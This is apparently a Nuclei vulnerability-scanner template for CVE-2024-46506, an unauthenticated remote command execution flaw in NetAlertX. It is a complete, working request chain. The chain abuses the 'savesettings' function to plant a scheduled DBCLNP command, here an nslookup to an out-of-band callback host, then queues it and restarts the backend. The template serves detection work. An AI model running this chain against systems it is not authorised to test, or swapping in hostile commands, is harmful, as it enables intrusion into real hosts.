id: CVE-2024-46506-compat
info:
  name: NetAlertX - Unauth RCE (Compat variant)
  author: mcy32
  severity: critical
  description: |
    NetAlertX allows unauthenticated attackers to execute arbitrary commands
    via the savesettings function by manipulating DBCLNP settings.
  reference:
    - https://rhinosecuritylabs.com/research/cve-2024-46506-rce-in-netalertx/
    - https://nvd.nist.gov/vuln/detail/CVE-2024-46506
  classification:
    cve-id: CVE-2024-46506
    cwe-id: CWE-306
    cvss-score: 10.0
  metadata:
    verified: true
    vendor: netalertx
    product: netalertx
  tags: cve,cve2024,netalertx,rce,oast,intrusive

variables:
  oast-dns: "{{interactsh-url}}"

http:
  - raw:
      # Save malicious settings
      - |
        POST /php/server/util.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        
        {"function":"savesettings","settings":[["DBCLNP","DBCLNP_RUN","string","*"],["DBCLNP","DBCLNP_CMD","string","nslookup {{oast-dns}}"],["DBCLNP","DBCLNP_RUN_SCHD","string","* * * * *"]]}
      
      # Trigger execution
      - |
        POST /php/server/util.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        
        {"function":"addToExecutionQueue","action":"test|run|DBCLNP"}
      
      # Restart backend
      - |
        POST /php/server/util.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        
        {"function":"addToExecutionQueue","action":"test|cron_restart_backend"}

    stop-at-first-match: true
    matchers:
      - type: dsl
        dsl:
          - contains(interactsh_protocol, 'dns')
          - status_code_1 == 200
          - status_code_2 == 200
          - status_code_3 == 200
        condition: and
